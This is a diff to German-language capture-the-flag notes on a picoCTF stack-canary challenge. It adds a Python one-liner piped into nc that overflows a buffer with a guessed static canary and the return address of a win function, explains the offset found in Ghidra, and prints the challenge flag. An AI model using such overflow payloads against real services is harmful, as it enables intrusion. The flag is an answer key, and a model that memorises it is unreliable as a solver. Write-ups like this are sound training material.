@@ -24,9 +24,21 @@ python -c "import sys; sys.stdout.buffer.write(b'B'*112 + b'\x96\x92\x04\x08' + 
 
 # 3
 ```
-python -c "import sys; sys.stdout.buffer.write(b'88' + b'\n' + b'B'*84 + b'\x36\x93\x04\x08' + b'\n')" | nc saturn.picoctf.net 54061
+python -c "import sys; sys.stdout.buffer.write(b'88' + b'\n' + b'B'*64 + b'BiRd' + b'B' * 16 + b'\x36\x93\x04\x08' + b'\n')" | nc saturn.picoctf.net 50171
 ```
 
 geht nicht wegen stack smashing (geheimer wert der vor dem return überprüft wird)
 
 Stack cannaries, man muss den zufälligen wert lesen oder hoffen, dass der wert nicht zufällig ist
+
+Durch probieren zufälliger Buchstaben wurde Canary bestimmt.
+
+In ghidra steht die Größe des Buffers:
+```
+undefined1[64]    Stack[-0x54]   buf
+```
+Heißt, das erst nach insgesamt 0x54 (84) Byte die Returnadresse stehen soll. Deshalb werden zu den davor 68 Byte noch 16 nonsense Byte aufgefüllt.
+Zuletzt wird noch die (umgedrehte) Adresse von win geschrieben und man bekommt die Flag:
+```
+picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}
+```
